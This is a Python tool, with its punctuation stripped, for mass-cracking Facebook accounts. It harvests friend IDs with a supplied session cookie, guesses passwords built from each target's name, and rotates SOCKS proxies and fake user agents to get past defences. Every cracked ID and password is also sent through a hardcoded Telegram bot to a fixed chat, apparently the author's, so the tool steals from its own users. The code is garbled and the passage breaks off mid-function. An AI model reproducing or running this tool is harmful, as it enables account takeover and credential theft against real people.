#-----------------[ IMPORT-MODULE ]-------------------#

def modules()
	print(033[1;37m [u001b[36m•033[1;37m] CHECKING FOR UPDATES 033[1;37m)
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try
		import rich
	except ModuleNotFoundError
		print(033[1;37m [u001b[36m•033[1;37m] RICH IS BEING INSTALLED 033[1;37m)
		os.system('pip install rich --quiet')
		print(033[1;37m [u001b[36m033[1;37m] RICH HAS BEEN INSTALLED 033[1;37m)
	exceptexit()
	try
		import bs4
	except ModuleNotFoundError
		print(033[1;37m [u001b[36m•033[1;37m] BS4 IS BEING INSTALLED 033[1;37m)
		os.system('pip install bs4 --quiet')
		print(033[1;37m [u001b[36m033[1;37m] BS4 HAS BEEN INSTALLED 033[1;37m)
	exceptexit()
	try
		import requests
	except ModuleNotFoundError
		print(033[1;37m [u001b[36m•033[1;37m] REQUESTS IS BEING INSTALLED 033[1;37m)
		os.system('pip install requests --quiet')
		print(033[1;37m [u001b[36m033[1;37m] REQUESTS HAS BEEN INSTALLED 033[1;37m)
	exceptexit()
	exit()

try
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

#------------------[ PROXY ]-------------------#

try
	prox= requests.get('httpsapi.proxyscrape.comv2request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e
	pass
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try
	prox= requests.get('httpsapi.proxyscrape.comv2request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e
	pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000)
	a='Mozilla5.0 (Symbian3; Series60'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='110.021.0028; ProfileMIDP-2.1 ConfigurationCLDC-1.1 ) AppleWebKit535.1 (KHTML, like Gecko) NokiaBrowser'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit537.36 (KHTML, like Gecko) Chrome'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10)
	a='Mozilla5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada1.2; en-us) AppleWebKit533.1 (KHTML, like Gecko) Dolfin'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS1.2.0 OPN-B'
	uak=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku()
	try
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua
			ugen.append(ub)
	except
		a=requests.get('httpsgithub.comcvandeplaspystemonblobmasteruser-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line(.)',str(a))
		for un in aa
			ua.write(un+'n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = 'x1b[1;97m'
M = 'x1b[1;91m'
H = 'x1b[1;92m'
K = 'x1b[1;93m'
B = 'x1b[1;94m'
U = 'x1b[1;95m' 
O = 'x1b[1;96m'
N = 'x1b[0m'    
Z = 033[1;30m
sir = '033[41mx1b[1;97m'
x = '33[m' # DEFAULT
m = 'x1b[1;91m' #RED +
k = '033[93m' # KUNING +
h = 'x1b[1;92m' # HIJAU +
hh = '033[32m' # HIJAU -
u = '033[95m' # UNGU
kk = '033[33m' # KUNING -
b = '33[1;96m' # BIRU -
p = 'x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

###----------[ ANSII COLOR STYLE ]---------- ###

Z = x1b[0;90m     # Hitam
M = x1b[38;5;196m # Merah
H = x1b[38;5;46m  # Hijau
K = x1b[38;5;226m # Kuning
B = x1b[38;5;44m  # Biru
U = x1b[0;95m     # Ungu
O = x1b[0;96m     # Biru Muda
P = x1b[38;5;231m # Putih
J = x1b[38;5;208m # Jingga
A = x1b[38;5;248m # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###

Z2 = [#000000] # Hitam
M2 = [#FF0000] # Merah
H2 = [#00FF00] # Hijau
K2 = [#FFFF00] # Kuning
B2 = [#00C8FF] # Biru
U2 = [#AF00FF] # Ungu
N2 = [#FF00FF] # Pink
O2 = [#00FFFF] # Biru Muda
P2 = [#FFFFFF] # Putih
J2 = [#FF8F00] # Jingga
A2 = [#AAAAAA] # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1''January','2''February','3''March','4''April','5''May','6''June','7''July','8''August','9''September','10''October','11''November','12''December'}
dic2 = {'01''January','02''February','03''March','04''April','05''May','06''June','07''July','08''August','09''September','10''October','11''November','12''Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+''+str(bln)+''+str(thn)
ltx = int(lt()[3])
if ltx  12
    a = ltx-12
    tag = PM
else
    a = ltx
    tag = AM

#------------------[ MACHINE-SUPPORT ]---------------#

def animation(u)
	for e in u + nsys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u)
        for e in u + nsys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear()
	os.system('clear')
def back()
	login()
def contact()
	os.system('xdg-open httpswww.facebook.comprofile.phpid=100084330534529')
	back()
def linex()
	print('033[1;37m----------------------------------------------')

#------------------[ LOGO-LAKNAT ]-----------------#

def banner()
	print(fn███╗░░░███╗██╗░██████╗██╗░░██╗░█████╗░███╗░░██╗
████╗░████║██║██╔════╝██║░░██║██╔══██╗████╗░██║
██╔████╔██║██║╚█████╗░███████║███████║██╔██╗██║
██║╚██╔╝██║██║░╚═══██╗██╔══██║██╔══██║██║╚████║
██║░╚═╝░██║██║██████╔╝██║░░██║██║░░██║██║░╚███║
╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
033[1;37m----------------------------------------------
 AUTHOR      MISHAN RICH
 GITHUB      MISHAN---XD
 FACEBOOK    MISHAN RICH
 VERSION    u001b[36m 0.0.1033[1;37m
033[1;37m----------------------------------------------)

#------------------[ TELEGRAM API ]-------------------#

tid = 5877909656
ip = requests.get(httpsapi.ipify.org).text

#------------------[ PASSWORD ASK ]-------------------#

def psw()
	os.system('clear')
	banner()
	print( [u001b[36m033[1;37m] ADD A PASSWORD TO YOUR ACCOUNT   )
	linex()
	upsw = input( [u001b[36m•033[1;37m] ENTER PASSWORD   )
	open('.password.txt','w').write(upsw)
	print('033[1;37m----------------------------------------------')
	animation('  YOUR PASSWORD HAS BEEN CHANGED ')
	exit()
try
	with open('.password.txt') as upwupass = upw.readline()
except FileNotFoundError
	psw()

def askpsw()
	askpw = input( [u001b[36m•033[1;37m] ENTER YOUR PASSWORD   )
	if askpw == upass
		linex()
		animation( [u001b[36m033[1;37m] ACCESS GRANTED  )
		time.sleep(1)
		pass
	else
		linex()
		animation( [u001b[36m×033[1;37m] ACCESS DENIED  )
		time.sleep(1)
		back()

def cpsw()
	linex()
	oldpsw = input( [u001b[36m•033[1;37m] ENTER OLD PASSWORD   )
	if oldpsw == upass
		linex()
		upsw = input( [u001b[36m•033[1;37m] ENTER NEW PASSWORD   )
		open('.password.txt','w').write(upsw)
		print('033[1;37m----------------------------------------------')
		animation('  YOUR PASSWORD HAS BEEN CHANGED ')
		time.sleep(1)
		pass
	else
		linex()
		animation( [u001b[36m×033[1;37m] WRONG PASSWORD  )
		time.sleep(1)
		back()

#------------------[ NAME ASK ]-------------------#

def asknamr()
	os.system('rm -rf .name.txt')
	linex()
	animation( [u001b[36m033[1;37m] NAME HAS BEEN RESET !!!  )
	exit()

def name() 
	os.system('clear')
	banner()
	print( [u001b[36m033[1;37m] USE YOUR REAL NAME OTHERWISE DISAPPROVAL )
	linex()
	uan = input( [u001b[36m•033[1;37m] ENTER YOUR NAME   )
	open('.name.txt','w').write(uan)
	print('033[1;37m----------------------------------------------')
	animation('  YOUR NAME HAS BEEN CHANGED ')
	exit()
try
	with open('.name.txt') as huname = h.readline()
except FileNotFoundError
	name()

#--------------------[ BAGIAN-MASUK ]--------------#

def login123()
	login_lagi334()
def login()
	try
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try
			sy = requests.get('httpsgraph.facebook.commefields=id,name&access_token='+tokenku[0], cookies={'cookie'cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError
			login123()
		except requests.exceptions.ConnectionError
			animation(f'033[0m u001b[36m033[1;37m CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError
		login123()
		
def login_lagi334()
	try
		os.system('clear')
		banner()
		print( [u001b[36m1033[1;37m] EXTENSION  COOKIE DOUGH
 [u001b[36m2033[1;37m] OPEN DESKTOP MODE
 [u001b[36m3033[1;37m] GO TO  www.facebook.comadsmanager
 [u001b[36m4033[1;37m] THEN OPEN EXTENSION COPY COOKIE)
		linex()
		your_cookies = input(' [u001b[36m•033[1;37m] ENTER COOKIE  ')
		with requests.Session() as r
			try
				r.headers.update({'content-type' 'applicationx-www-form-urlencoded',})
				data = {'access_token' '1348564698517390007c0a9101b9e1c8ffab727666805038','scope' ''}
				response = json.loads(r.post('httpsgraph.facebook.comv2.6devicelogin', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('httpsm.facebook.comdeviceuser_code={}'.format(user_code)), ('httpsgraph.facebook.comv2.6devicelogin_statusmethod=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode' 'navigate','user-agent' 'Mozilla5.0 (Linux; Android 9; RMX1941 BuildPPR1.180610.011; wv) AppleWebKit537.36 (KHTML, like Gecko) Version4.0 Chrome107.0.5304.54 Mobile Safari537.36','sec-fetch-site' 'cross-site','Host' 'm.facebook.com','accept' 'texthtml,applicationxhtml+xml,applicationxml;q=0.9,imageavif,imagewebp,imageapng,;q=0.8,applicationsigned-exchange;v=b3;q=0.9','sec-fetch-dest' 'document',})
				response2 = r.get(verification_url, cookies = {'cookie' your_cookies}).text
				if 'How do you want to log into Facebook' in str(response2) or 'loginnext=' in str(response2)
					linex()
					animation(f'033[0m u001b[36m033[1;37m LOGIN TOKENCOOKIE EXPIRED')
					exit()
				else
					action = re.search('action=(.)', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name=fb_dtsg value=(.)', str(response2)).group(1)
					jazoest = re.search('name=jazoest value=(d+)', str(response2)).group(1)
					data = {'fb_dtsg' fb_dtsg,'jazoest' jazoest,'qr' 0,'user_code' user_code,}
					r.headers.update({'origin' 'httpsm.facebook.com','referer' verification_url,'content-type' 'applicationx-www-form-urlencoded','sec-fetch-site' 'same-origin',})
					response3 = r.post('httpsm.facebook.com{}'.format(action), data = data, cookies = {'cookie' your_cookies})
					if 'httpsm.facebook.comdialogoauthauth_type=rerequest&redirect_uri=' in str(response3.url)
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie' your_cookies}).text
						action = re.search('action=(.)', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name=fb_dtsg value=(.)', str(response4)).group(1)
						jazoest = re.search('name=jazoest value=(d+)', str(response4)).group(1)
						scope = re.search('name=scope value=(.)', str(response4)).group(1)
						display = re.search('name=display value=(.)', str(response4)).group(1)
						user_code = re.search('name=user_code value=(.)', str(response4)).group(1)
						logger_id = re.search('name=logger_id value=(.)', str(response4)).group(1)
						auth_type = re.search('name=auth_type value=(.)', str(response4)).group(1)
						encrypted_post_body = re.search('name=encrypted_post_body value=(.)', str(response4)).group(1)
						return_format = re.search('name=return_format[] value=(.)', str(response4)).group(1)
						r.headers.update({'origin' 'httpsm.facebook.com','referer' response3.url,'content-type' 'applicationx-www-form-urlencoded',})
						data = {'fb_dtsg' fb_dtsg,'jazoest' jazoest,'scope' scope,'display' display,'user_code' user_code,'logger_id' logger_id,'auth_type' auth_type,'encrypted_post_body' encrypted_post_body,'return_format[]' return_format,}
						response5 = r.post('httpsm.facebook.com{}'.format(action), data = data, cookies = {'cookie' your_cookies}).text
						windows_referer = re.search('window.location.href=(.)', str(response5)).group(1).replace('', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer' 'httpsm.facebook.com',})
						response6 = r.get(windows_referer, cookies = {'cookie' your_cookies}).text
						if 'Success!' in str(response6)
							r.headers.update({'sec-fetch-mode' 'no-cors','referer' 'httpsgraph.facebook.com','Host' 'graph.facebook.com','accept' '','sec-fetch-dest' 'script','sec-fetch-site' 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie' your_cookies}).text
							access_token = re.search('access_token (.)', str(response7)).group(1)
							tokenew = open(.token.txt,w).write(access_token)
							cook= open(.cok.txt,w).write(your_cookies)
							linex()
							animation(f'033[0m u001b[36m033[1;37m LOGIN DONE RESTART');exit()
			except Exception as e
				linex()
				animation(f'033[0m u001b[36m033[1;37m LOGIN TOKENCOOKIE EXPIRED')
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				time.sleep(1)
				back()
	except Exception as e
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id)
	try
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		insert_cookie()
	os.system('clear')
	banner()
	print( [u001b[36m•033[1;37m] WELCOME      +uname)
	print( [u001b[36m•033[1;37m] TODAYS DATE  +date)
	linex()
	print(f [u001b[36m1033[1;37m] CRACK PUBLIC       [u001b[36m5033[1;37m] RESET NAME)
	print(f [u001b[36m2033[1;37m] CRACK FILE         [u001b[36m6033[1;37m] CONTACT ADMIN)
	print(f [u001b[36m3033[1;37m] CHECK RESULTS      [u001b[36m0033[1;37m] LOGOUT MENU)
	print(f [u001b[36m4033[1;37m] CHANGE PASSWORD)
	linex()
	_____cowok__pink_____ = input(' CHOOSE  ')
	if _____cowok__pink_____ in ['1']
		dump_massal()
	elif _____cowok__pink_____ in ['2']
		crack_file()
	elif _____cowok__pink_____ in ['3','03']
		result()
	elif _____cowok__pink_____ in ['4','04']
		cpsw()
	elif _____cowok__pink_____ in ['5','05']
		asknamr()
	elif _____cowok__pink_____ in ['6','06']
		contact()
	elif _____cowok__pink_____ in ['0']
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		linex()
		animation(' [×] DONE LOGOUT ')
		exit()
	else
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()

	#-----------------[ HASIL-CRACK ]-----------------#

def result()
	linex()
	askpsw()
	os.system('clear')
	banner()
	print(' [u001b[36m1033[1;37m] CHECK CP IDZ ')
	print(' [u001b[36m2033[1;37m] CHECK OK IDZ ')
	print(' [u001b[36m0033[1;37m] EXIT ')
	linex()
	kz = input(' [u001b[36m•033[1;37m] CHOOSE  ')
	if kz in ['1','01']
		tryvin = os.listdir('CP')
		except FileNotFoundError
			linex()
			animation(' [u001b[36m×033[1;37m] FILE NOT FOUND ')
			time.sleep(3)
			back()
		if len(vin)==0
			linex()
			animation(' [u001b[36m•033[1;37m] NO CP RESULTS FOUND ')
			time.sleep(2)
			back()
		else
			cih = 0
			lol = {}
			for isi in vin
				tryhem = open('CP'+isi,'r').readlines()
				exceptcontinue
				cih+=1
				if cih10
					nom = ''+str(cih)
					lol.update({str(cih)str(isi)})
					lol.update({nomstr(isi)})
					linex()
					print(' '+nom+'. '+isi+'033[31m '+str(len(hem))+' 033[0m CP '+x)
				else
					lol.update({str(cih)str(isi)})
					print(' '+str(cih)+'. '+isi+'033[31m '+str(len(hem))+' 033[0m CP '+x)
			linex()
			geeh = input(' [u001b[36m•033[1;37m] CHOOSE  ')
			linex()
			trygeh = lol[geeh]
			except KeyError
				linex()
				animation(' [u001b[36m×033[1;37m] NO OPTION FOUND ')
				exit()
			trylin = open('CP'+geh,'r').read().splitlines()
			except
				linex()
				animation(' [u001b[36m×033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin))
				cpkuni=lin[nocp].split('')
				print(f' [u001b[36m•033[1;37m] CP  033[33m {cpkuni[0]}{cpkuni[1]}033[0m')
				nocp +=1
			linex()
			input('  PRESS ENTER TO BACK ')
			back()
	elif kz in ['2','02']
		tryvin = os.listdir('OK')
		except FileNotFoundError
			linex()
			animation(' [u001b[36m×033[1;37m] FILE NOT FOUND ')
			time.sleep(2)
			back()
		if len(vin)==0
			linex()
			animation(' [u001b[36m•033[1;37m] NO OK RESULTS FOUND ')
			time.sleep(2)
			back()
		else
			cih = 0
			lol = {}
			for isi in vin
				tryhem = open('OK'+isi,'r').readlines()
				exceptcontinue
				cih+=1
				if cih100
					linex()
					nom = ''+str(cih)
					lol.update({str(cih)str(isi)})
					lol.update({nomstr(isi)})
					print(' '+nom+'. '+isi+'033[32m '+str(len(hem))+' 033[0m OK '+x)
				else
					lol.update({str(cih)str(isi)})
					print(' '+str(cih)+'. '+isi+'033[32m '+str(len(hem))+' 033[0m OK '+x)
			linex()
			geeh = input(' [u001b[36m•033[1;37m] CHOOSE  ')
			linex()
			trygeh = lol[geeh]
			except KeyError
				linex()
				animation(' [u001b[36m×033[1;37m] NO OPTION FOUND ')
				exit()
			trylin = open('OK'+geh,'r').read().splitlines()
			except
				linex()
				animation(' [u001b[36m×033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin))
				cpkuni=lin[nocp].split('')
				print(f' [u001b[36m•033[1;37m] OK  033[32m {cpkuni[0]}{cpkuni[1]}033[0m')
				nocp +=1
			linex()
			input('  PRESS ENTER TO BACK ')
			back()
	elif kz in ['0','00']
		back()
	else
		linex()
		animation(' [u001b[36m×033[1;37m] NO OPTION FOUND IN MENU')
		exit()

#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal()
	try
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError
		exit()
	try
		linex()
		jum = int(input(' [u001b[36m•033[1;37m] ENTER TARGET AMOUNT   '))
		linex()
	except ValueError
		linex()
		animation(' [×] INVALID OPTION ')
		exit()
	if jum1 or jum100000000
		linex()
		animation(' [×] TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum)
		yz+=1
		kl = input(' [u001b[36m•033[1;37m] INPUT UID '+str(yz)+'  ')
		uid.append(kl)
	for userr in uid
		try
			col = ses.get('httpsgraph.facebook.comv2.0'+userr+'fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies'cok}).json()
			for mi in col['friends']['data']
				try
					iso = (mi['id']+''+mi['name'])
					if iso in idpass
					elseid.append(iso)
				exceptcontinue
		except (KeyError,IOError)
			pass
		except requests.exceptions.ConnectionError
			linex()
			animation(' [×] TRY AGAIN ')
			os.system('clear')
	try
		linex()
		print(f' [u001b[36m•033[1;37m] TOTAL ID  u001b[36m'+str(len(id))+'033[1;37m')
		setting()
	except requests.exceptions.ConnectionError
		print(f'{u}')
		back()
	except (KeyError,IOError)
		linex()
		animation( [×] DUMP ID FAILED )
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#

def crack_file()
	linex()
	o = input(' [u001b[36m•033[1;37m] FILE NAME  ')
	trylin = open(o).read().splitlines()
	except
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin
		id.append(xid)
	setting()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting()
	linex()
	print( [u001b[36m1033[1;37m] ONLY OLD IDZ)
	print( [u001b[36m2033[1;37m] ONLY NEW IDZ)
	print( [u001b[36m3033[1;37m] BOTH MIX IDZ)
	linex()
	hu = input(' [u001b[36m•033[1;37m] CHOOSE  ')
	if hu in ['1','01']
		for tua in sorted(id)
			id2.append(tua)
	elif hu in ['2','02']
		muda=[] 
		for bacot in sorted(id)
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm)
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']
		for bacot in id
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else
		for bacot in id
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	print( [u001b[36m•033[1;37m] LOGIN METHOD )
	linex()
	print( [u001b[36m1033[1;37m] METHOD 1)
	print( [u001b[36m2033[1;37m] METHOD 2)
	linex()
	hc = input(' [u001b[36m•033[1;37m] CHOOSE  ')
	if hc in ['1','01']
		method.append('mobile')
#	elif hc in ['2','02']
#		method.append('p')
#	elif hc in ['3','03']
#		method.append('touch')
	elif hc in ['4','04']
		method.append('free')
	else
		method.append('mobile')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd()
	os.system('clear')
	banner()
	print(f' [u001b[36m•033[1;37m] TOTAL IDz  u001b[36m',str(len(id)))
	print( 033[1;37m[u001b[36m•033[1;37m] YOU STARTED CLONING AT  +time.strftime(%H%M)+ + tag)
	linex()
	print(f' u001b[36m 033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
	linex()
	with tred(max_workers=30) as pool
		for yuzong in id2
			idf,nmf = yuzong.split('')[0],yuzong.split('')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)6
				if len(frs)3
					pass
				else
					pwv.append(nmf)
					pwv.append(frs+'@@')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'@123456')
			else
				if len(frs)3
					pwv.append(nmf)
				else
					pwv.append(nmf)
					pwv.append(nmf)
					pwv.append(frs+'@@')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'@123456')
			if 'ya' in pwpluss
				for xpwd in pwnya
					pwv.append(xpwd)
			elsepass
			if 'mobile' in method
				pool.submit(crack,idf,pwv)
			elif 'free' in method
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method
				pool.submit(cracktouch,idf,pwv)
			elif 'free' in method
				pool.submit(crackfree,idf,pwv)
			else
				pool.submit(crackmbasic,idf,pwv)
	print('n033[1;37m----------------------------------------------')
	print(' [u001b[36m•033[1;37m] CLONING COMPLETE AT '+time.strftime(%H%M)+ + tag)
	print(' [u001b[36m•033[1;37m] OK  %s '%(ok))
	print(' [u001b[36m•033[1;37m] CP  %s '%(cp))
	linex()
	woi = input(' u001b[36m033[1;37m ENTER TO BACK')
	exit()

#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv)
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(fr {P}[MISHAN-DW]{P} {P}{loop}{P}{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{.0%}'.format(loopfloat(len(id)))}{P}]  ),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv
		try
			nip=random.choice(prox)
			proxs= {'http' 'socks4'+nip}
			ses.headers.update({Host'm.facebook.com',upgrade-insecure-requests1,user-agentua2,accepttexthtml,applicationxhtml+xml,applicationxml;q=0.9,imageavif,imagewebp,imageapng,[inserted by cython to avoid comment closer][inserted by cython to avoid comment start];q=0.8,applicationsigned-exchange;v=b3;q=0.9,dnt1,x-requested-withmark.via.gp,sec-fetch-sitesame-origin,sec-fetch-modecors,sec-fetch-userempty,sec-fetch-destdocument,refererhttpsm.facebook.com,accept-encodinggzip, deflate br,accept-languageen-GB,en-US;q=0.9,en;q=0.8})
			p = ses.get('httpsp.facebook.comlogindevice-basedpassworduid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={lsdre.search('name=lsd value=(.)', str(p.text)).group(1),jazoestre.search('name=jazoest value=(.)', str(p.text)).group(1),uididf,nexthttpsp.facebook.comloginsave-device,flowlogin_no_pin,passpw,}
			koki = (;).join([ %s=%s % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={Host'm.facebook.com',cache-controlmax-age=0,upgrade-insecure-requests1,originhttpsm.facebook.com,content-typeapplicationx-www-form-urlencoded,user-agentua,accepttexthtml,applicationxhtml+xml,applicationxml;q=0.9,imageavif,imagewebp,imageapng,[inserted by cython to avoid comment closer][inserted by cython to avoid comment start];q=0.8,applicationsigned-exchange;v=b3;q=0.9,x-requested-withmark.via.gp,sec-fetch-sitesame-origin,sec-fetch-modecors,sec-fetch-userempty,sec-fetch-destdocument,refererhttpsm.facebook.comindex.phpnext=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F,accept-encodinggzip, deflate br,accept-languageen-GB,en-US;q=0.9,en;q=0.8}
			po = ses.post('httpsp.facebook.comlogindevice-basedvalidate-passwordshbl=0',data=dataa,cookies={'cookie' koki},headers=heade,allow_redirects=False,proxies=proxs)
			if checkpoint in po.cookies.get_dict().keys()
				print(f'r{P}{K} [{time.strftime(%H%M)}-CP] {idf} │ {pw} {P}')
				open('CP'+cpc,'a').write(idf+''+pw+'n')
				akun.append(idf+''+pw)
				cp+=1
				break
			elif c_user in ses.cookies.get_dict().keys()
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (;).join([ %s=%s % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'r{P}{H} [{time.strftime(%H%M)}-OK] {idf} │ {pw} {P}')
				open('OK'+okc,'a').write(idf+''+pw+'n')
				requests.get(httpsapi.telegram.orgbot6143260559AAEAPrCMNwHH9Dllv-vJHIc1snwdrK4r7PwsendMessagechat_id=+tid+&text=+uname+n[ +idf+'  '+pw+  ])
				break
			else
				continue
		except requests.exceptions.ConnectionError
			time.sleep(31)
	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv)
	global loop,ok,cp
